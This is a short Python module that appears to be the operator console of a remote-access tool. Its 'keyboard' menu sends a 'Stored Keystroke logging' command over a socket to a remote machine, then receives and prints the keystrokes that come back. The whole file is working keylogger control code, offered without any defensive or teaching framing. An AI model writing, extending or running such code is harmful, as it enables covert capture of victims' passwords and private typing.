from prettytable import PrettyTable
import struct


def keyboard(conn):
    table = PrettyTable()
    table.title = '\033[1;34;34m' + "keyboard" + '\033[0m'
    table.field_names = ['\033[1;34;34m' + "Num" + '\033[0m', '\033[1;34;34m' + "Model" + '\033[0m', '\033[1;34;34m' + "Usage" + '\033[0m']
    table.add_rows([
        ["1", "存储记录", "1"]
    ])
    print(table)
    print('\033[1;34;34m' + "[*] Enter \"exit\" to exit the keyboard recorder." + '\033[0m')
    while True:
        choice = input('\033[1;1;1m' + "keyboard > " + '\033[0m')
        if choice == 'exit':
            break
        elif choice.lower() == 'help':
            print(table)
            continue
        elif choice == '1':
            command = "Stored Keystroke logging"
            receive(conn, command)
        else:
            continue


def receive(conn, command):
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
